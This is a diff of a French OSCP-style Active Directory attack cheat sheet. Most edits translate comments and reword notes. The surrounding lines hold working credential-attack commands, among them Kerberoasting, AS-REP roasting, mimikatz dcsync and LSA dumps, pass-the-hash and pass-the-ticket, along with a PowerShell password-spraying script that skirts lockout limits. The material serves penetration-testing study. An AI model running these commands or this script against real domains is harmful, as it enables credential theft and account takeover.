@@ -50,7 +50,7 @@ GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
 ```
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -104,7 +104,7 @@ Rubeus.exe kerberoast /outfile:[output_file].kerberoast
 ```
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -155,7 +155,7 @@ Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalNa
 # Autre possibilité
 Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
 
-# 2. Extract the NTLM hash
+# 2. Extraire le hash NTLM
 mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]
 
 # Exemple :
@@ -197,7 +197,7 @@ klist
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Faux tickets de service (Silver Tickets)».</p>
 
 ```bash
 dir \\targetserver\sharedfolder
@@ -302,7 +302,7 @@ mimikatz # lsadump::dcsync /domain:domain.com > output.txt
 ```
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
@@ -341,7 +341,7 @@ mimikatz # lsadump::cache
 ```
 
 
-<p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
+<p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
@@ -368,7 +368,7 @@ mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Authentification NTLM».</p>
 
 ```bash
 dir \\targetserver\sharedfolder
@@ -397,7 +397,7 @@ mimikatz # kerberos::ptt TGT_ticket.kirbi
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Authentification Kerberos».</p>
 
 ```bash
 dir \\targetserver\sharedfolder
@@ -408,7 +408,7 @@ dir \\targetserver\sharedfolder
 #### Exécuter le script
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Exécuter le script ».</p>
+<p class="oscp-command-note">Spray-Passwords.ps1 : tester un mot de passe de laboratoire en respectant les limites de verrouillage.</p>
 
 ```powershell
 # -Pass nous permet d'utiliser un seul mot de passe pour tester.
@@ -422,7 +422,7 @@ dir \\targetserver\sharedfolder
 #### Code source du script
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Code source of the Script ».</p>
+<p class="oscp-command-note">Code source PowerShell du script de test des mots de passe, à enregistrer avant utilisation.</p>
 
 ```powershell
 <#
@@ -520,14 +520,14 @@ Param
 
 )
 
-# Method to determine if input is numeric or not
+# Méthode pour vérifier qu'une entrée est numérique
 Function isNumeric ($x) {
     $x2 = 0
     $isNum = [System.Int32]::TryParse($x, [ref]$x2)
     Return $isNum
 }
 
-# Method to get the lockout threshold - does not take FGPP into acocunt
+# Lire le seuil de verrouillage, sans tenir compte des stratégies de mots de passe affinées (FGPP)
 Function Get-threshold
 {
     $data = net accounts
@@ -547,7 +547,7 @@ Function Get-threshold
     Return $threshold
 }
 
-# Method to get the lockout observation window - does not tage FGPP into account
+# Lire la fenêtre d'observation du verrouillage, sans inclure les stratégies affinées FGPP.
 Function Get-Duration
 {
     $data = net accounts
@@ -577,7 +577,7 @@ Function Get-UserObjects
     $objDomain = New-Object System.DirectoryServices.DirectoryEntry
     $Searcher.SearchRoot = $objDomain
 
-    # Select properties to load, to speed things up a bit
+    # Sélectionner uniquement les propriétés utiles pour accélérer la requête.
     $Searcher.PropertiesToLoad.Add("samaccountname") > $Null
     $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
     $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null
@@ -620,7 +620,7 @@ Function Parse-Url
     $data = (New-Object System.Net.WebClient).DownloadString($url)
     $data = $data.Split([environment]::NewLine)
 
-    # Parse passwords file and return results
+    # Lire le fichier de mots de passe et restituer les résultats.
     If ($data -eq $null -or $data -eq "") {Return $null}
     $passwords = $data.Split(",").Trim()
     Return $passwords
@@ -642,7 +642,7 @@ Function Parse-File
    Else {Return $null}
 }
 
-# Main function to perform the actual brute force attack
+# Fonction principale de test des mots de passe
 Function BruteForce
 {
    Param ([Int]$duration,[Int]$threshold,[String[]]$passwords)
@@ -670,14 +670,14 @@ Function BruteForce
         $numTry += 0
    }
 
-   # Main while loop which does the actual brute force.
+   # Boucle principale du test d'authentification.
    Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
    :Main While ($true)
    {
         # Obtenir des comptes utilisateurs
         $userObj = Get-UserObjects
 
-        # Iterate over every user in AD
+        # Parcourir les comptes utilisateurs Active Directory.
         For ($i = 0; $i -lt $userObj.Length; $i += 1)
         {
 
@@ -720,7 +720,7 @@ Function BruteForce
                         }
                     }
 
-                    # One more tries would result in lockout, unless timer has expired, let's see...
+                    # Une tentative supplémentaire risquerait de verrouiller le compte, sauf expiration de la fenêtre.
                     Else
                     {
                         $now = Get-Date
@@ -754,7 +754,7 @@ Function BruteForce
                         }
                         Else
                         {
-                            # Verbose-log if $badpwdtime in null. Possible "Cannot index into a null array" error.
+                            # Journaliser le cas où $badpwdtime est nul : la variable peut provoquer une erreur de tableau.
                             Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
 
 
@@ -978,8 +978,8 @@ crackmapexec winrm [ip/domain] -u [users_file].txt -p '[password]' -d [domain.co
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec http [ip/domain] -u [userName] -p '[password]'
+# HTTP : consulter les en-têtes avec curl (CrackMapExec ne gère pas HTTP).
+curl -I http://<IP>:80/
 
 ```
 
@@ -992,22 +992,22 @@ crackmapexec ftp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec telnet [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+# Telnet : tester une connexion TCP au port 23 avec Netcat.
+nc -nv <IP> 23
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec smtp [ip/domain] -u [users_file].txt -p '[password]'
+# SMTP : identifier les commandes annoncées par le serveur avec Nmap.
+nmap -sV -p 25 --script smtp-commands <IP>
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec dns [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+# DNS : interroger l'enregistrement SOA du domaine avec dig.
+dig @<SERVEUR_DNS> <DOMAINE> SOA +noall +answer
 
 ```
 
@@ -1020,22 +1020,22 @@ crackmapexec ldap [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec netbios [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
+# NetBIOS : interroger la table de noms avec nmblookup.
+nmblookup -A <IP>
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec mysql [ip/domain] -u [users_file].txt -p '[password]'
+# MySQL : se connecter avec le client natif et afficher les bases accessibles.
+mysql -h <IP> -u <UTILISATEUR> -p -e 'SHOW DATABASES;'
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec postgres [ip/domain] -u [users_file].txt -p '[password]'
+# PostgreSQL : lister les bases accessibles avec psql.
+psql -h <IP> -U <UTILISATEUR> -d postgres -c '\l'
 
 ```
 
@@ -1048,36 +1048,36 @@ crackmapexec mssql [ip/domain] -u [users_file].txt -p '[password]'
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec oracle [ip/domain] -u [users_file].txt -p '[password]'
+# Oracle : se connecter avec SQL*Plus si le nom du service est connu.
+sqlplus '<UTILISATEUR>/<MOT_DE_PASSE>@//<IP>:1521/<SERVICE>'
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec redis [ip/domain] -u [users_file].txt -p '[password]'
+# Redis : interroger les informations du serveur avec redis-cli.
+redis-cli -h <IP> -p 6379 INFO
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec docker [ip/domain] -u [users_file].txt -p '[password]'
+# Docker : lire la version du démon distant si son API TCP est accessible.
+docker -H tcp://<IP>:2375 version
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec snmp [ip/domain] -u [users_file].txt -p '[password]'
+# SNMP : consulter les informations système avec une communauté d'audit.
+snmpwalk -v2c -c '<COMMUNAUTE>' <IP> 1.3.6.1.2.1.1
 
 ```
 
 
 ```bash
-# Examiner le service avec CrackMapExec
-crackmapexec ntp [ip/domain]
+# NTP : consulter les pairs annoncés par le service avec ntpq.
+ntpq -p <IP>
 
 ```
 
@@ -1122,7 +1122,7 @@ timedatectl show -p NTPSynchronized -p TimeUSec
 
 
 ```powershell
-# -p X: this indicates which disk we wanto to copy, usually is C.
+# -p X: sélectionne le lecteur à copier (souvent C:).
 vshadow.exe -nw -p C:
 
 ```
@@ -1132,7 +1132,7 @@ vshadow.exe -nw -p C:
 `C:`  
 
 
-<p class="oscp-command-note">Script PowerShell dans la rubrique « Shadow Copies ».</p>
+<p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Copies instantanées (Shadow Copies)».</p>
 
 ```powershell
 # Remplacer X par le numéro de copie d'ombre, trouvé dans la commande précédente
@@ -1194,7 +1194,7 @@ mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\ShadowCopy</code></p>
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Copies instantanées (Shadow Copies)».</p>
 
 ```powershell
 dir C:\ShadowCopy
@@ -1379,7 +1379,7 @@ crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>
+<p class="oscp-command-note">Nmap (RDP) : lancer les scripts NSE « rdp-ntlm-info ».</p>
 
 ```bash
 nmap -p 3389 --script rdp-ntlm-info [IP]
@@ -1529,7 +1529,7 @@ Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Pass-the-Ticket (PtT) ».</p>
+<p class="oscp-command-note">Kerberos : convertir un ticket .kirbi au format .ccache puis définir KRB5CCNAME.</p>
 
 ```bash
 # Depuis Kali
